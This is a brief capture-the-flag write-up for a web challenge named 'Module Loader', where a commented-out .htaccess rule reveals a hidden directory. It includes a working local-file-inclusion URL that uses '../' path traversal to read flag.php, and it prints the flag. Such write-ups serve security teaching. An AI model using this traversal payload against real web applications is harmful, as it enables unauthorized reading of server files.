### Module Loader

100 Points by lucebac (Web)

Since his students never know what date it is and how much time they have until the next homework's deadline, Mr P. H. Porter wrote a little webapp for that.

1. LFI

2. .htacess

<!--
# seems to be not working, though
#<Directory "3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae">
#    Options -Indexes
#</Directory>
# -->

3. 3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae directory:


4. Exploit LFI:

https://school.fluxfingers.net:1522/?module=../3cdcf3c63dc02f8e5c230943d9f1f4d75a4d88ae/flag.php

5. Flag

flag{hidden_is_not_actually_hidden}